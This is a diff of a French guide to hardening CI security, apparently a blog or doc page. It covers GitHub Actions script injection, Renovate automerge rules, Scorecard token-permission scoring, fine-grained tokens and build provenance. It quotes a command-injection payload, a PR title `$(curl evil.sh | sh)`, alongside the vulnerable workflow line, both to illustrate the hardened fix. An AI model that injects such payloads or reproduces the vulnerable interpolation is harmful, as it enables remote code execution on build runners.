@@ -138,12 +138,14 @@ C'est la vuln la plus facile à introduire et la plus dure à voir en relecture.
 
 ```yaml
 # Vulnérable : le titre de la PR est collé tel quel dans le script
-- run: echo "PR: ${{ github.event.pull_request.title }}"
+- run: |
+    echo "PR: ${{ github.event.pull_request.title }}"
 
 # Durci : bash reçoit une variable, quel que soit son contenu
 - env:
     TITLE: ${{ github.event.pull_request.title }}
-  run: echo "PR: $TITLE"
+  run: |
+    echo "PR: $TITLE"
 ```
 
 Une PR titrée `$(curl evil.sh | sh)` s'exécute donc dans le premier cas et bash n'a aucun moyen de savoir d'où vient la valeur. En passant par `env:`, le contenu reste une chaîne, quoi qu'il y ait dedans.
@@ -205,11 +207,17 @@ L'automerge est le prolongement logique d'une CI en laquelle on a confiance : Re
 
 ```json title="renovate.json"
 {
-  "matchUpdateTypes": ["minor", "patch", "digest"],
-  "automerge": true,
-  "automergeType": "pr"
+  "packageRules": [
+    {
+      "matchUpdateTypes": ["minor", "patch", "digest"],
+      "automerge": true,
+      "automergeType": "pr"
+    }
+  ]
 }
 ```
+
+`matchUpdateTypes` n'existe que dans une `packageRules`, la doc de l'option le dit : *valid only within `packageRules` object*. Posé à la racine, `renovate-config-validator` sort `"matchUpdateTypes" can't be used in ".". Allowed objects: packageRules.` et Renovate ouvre une issue *Action Required* au lieu de tourner.
 
 `automergeType: pr` ouvre quand même une PR et attend les checks : l'automerge ne court-circuite pas la CI, il retire juste le clic une fois qu'elle est verte.
 
@@ -217,8 +225,12 @@ Reste un trou que la CI verte ne bouche pas : automerger une version publiée il
 
 ```json title="renovate.json"
 {
-  "matchUpdateTypes": ["major", "minor", "patch", "digest"],
-  "minimumReleaseAge": "5 days"
+  "packageRules": [
+    {
+      "matchUpdateTypes": ["major", "minor", "patch", "digest"],
+      "minimumReleaseAge": "5 days"
+    }
+  ]
 }
 ```
 
@@ -307,7 +319,7 @@ GitHub prépare son propre pare-feu d'egress natif, décrit dans la roadmap 2026
 
 ### Scorecard : lire le delta, pas le score
 
-Le score global de Scorecard est le chiffre le moins utile qu'il produit. Sur un projet maintenu par une seule personne, 4 checks sont hors d'atteinte par construction : Code-Review veut des changesets approuvés et GitHub interdit d'approuver sa propre PR, Contributors veut des contributeurs de 2 organisations, il y a Fuzzing et le badge CII. Le plafond réaliste tourne autour de 8 et courir après les 2 points restants produit du travail décoratif.
+Le score global de Scorecard est le chiffre le moins utile qu'il produit. Sur un projet maintenu par une seule personne, 4 checks sont hors d'atteinte par construction : Code-Review veut des changesets approuvés et GitHub interdit d'approuver sa propre PR, Contributors veut des contributeurs de 3 organisations différentes, il y a Fuzzing et le badge CII. Le plafond réaliste tourne autour de 8 et courir après les 2 points restants produit du travail décoratif.
 
 Ce qui vaut, c'est ce que les autres outils ne regardent pas et ce que le prochain scan trouvera de différent.
 
@@ -318,9 +330,9 @@ Ce qui vaut, c'est ce que les autres outils ne regardent pas et ce que le procha
 | Signed-Releases | une release sans signature ni provenance |
 | Pinned-Dependencies | les images de base d'un Dockerfile, pas seulement les actions |
 
-Le reste recoupe zizmor, govulncheck, CodeQL et Renovate. Sur 3 repos passés au crible, Token-Permissions sortait à **0** partout, ce qu'aucun des autres outils n'avait signalé : le check tombe à zéro dès qu'un seul workflow déclare une permission en `write` au niveau du fichier, même si le fichier n'a qu'un job et que le droit est légitime. Descendre le bloc dans le job le remet à 10.
+Le reste recoupe zizmor, govulncheck, CodeQL et Renovate. Sur 3 repos passés au crible, Token-Permissions sortait à **0** partout, ce qu'aucun des autres outils n'avait signalé. Le barème n'est pas binaire pour autant : dans `reduceBy`, seuls `contents`, `packages` et `actions` en `write` au niveau du fichier annulent le check d'un coup. `deployments` et `security-events` coûtent 1 point, `checks` et `statuses` 0,5, et tout le reste, `pull-requests`, `issues`, `id-token`, `attestations`, ne coûte rien. Autrement dit un `security-events: write` global sort à 9 et pas à 0, alors qu'un `contents: write` global suffit à tout perdre. Dans les 2 cas, descendre le bloc dans le job remet à 10.
 
-2 pièges d'installation. Le check Branch-Protection lit des réglages que le `GITHUB_TOKEN` ne voit pas, donc sans un PAT classique en `public_repo` passé via `repo_token`, il revient `inconclusive` et c'est justement le seul check qu'on ne peut obtenir autrement. Et `api.securityscorecards.dev` republie le dataset par lots, donc le score y reste celui du scan précédent pendant un moment : le résultat frais est dans les alertes code scanning du repo, pas dans l'API.
+2 pièges d'installation. Le check Branch-Protection lit des réglages que le `GITHUB_TOKEN` ne voit pas, donc sans un PAT passé via `repo_token` il revient `inconclusive`, et c'est justement le seul check qu'on ne peut obtenir autrement. Le token à créer est un **fine-grained** avec `Administration: Read-only`, ce qui entraîne `Metadata: Read-only`. Surtout pas un token classique : il faudrait lui donner le scope `repo`, soit un write complet sur le dépôt, pour un besoin en lecture seule, et upstream écrit noir sur blanc *we strongly discourage its use*. Ce secret est lisible par tous les workflows et tous les mainteneurs du repo. Et `api.securityscorecards.dev` republie le dataset par lots, donc le score y reste celui du scan précédent pendant un moment : le résultat frais est dans les alertes code scanning du repo, pas dans l'API.
 
 !!! warning "La résolution des conversations transforme un linter en gate"
     Activer `required_conversation_resolution` sur une branche protégée, alors que la CI fait tourner reviewdog en `reporter: github-pr-review`, veut dire que chaque remarque de linter ouvre un fil non résolu qui bloque le merge. Le check reste vert et la PR reste rouge, ce qui se diagnostique mal. C'est le comportement voulu, mais il faut le décider plutôt que le découvrir.
@@ -331,15 +343,20 @@ Une signature dit **qui** a publié. Elle ne dit pas depuis quel repo, quel comm
 
 Ça tient en un step et 2 permissions, quel que soit ce qu'on publie :
 
-```yaml
-permissions:
-  id-token: write      # identité keyless qui signe l'attestation
-  attestations: write  # écrire l'attestation sur le repo
-
+```yaml title=".github/workflows/release.yml"
+jobs:
+  release:
+    permissions:
+      id-token: write      # identité keyless qui signe l'attestation
+      attestations: write  # écrire l'attestation sur le repo
+    steps:
+      # ... build ...
       - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2
         with:
           subject-path: 'dist/*.tar.gz,dist/checksums.txt'
 ```
+
+Les 2 permissions se posent au niveau du job et pas en tête de fichier, sinon tous les autres jobs du workflow les portent aussi.
 
 Pour une image OCI, la provenance s'attache au digest et pas à un fichier et `push-to-registry` la publie à côté du manifest pour qu'un consommateur la trouve sans passer par la release GitHub :
 
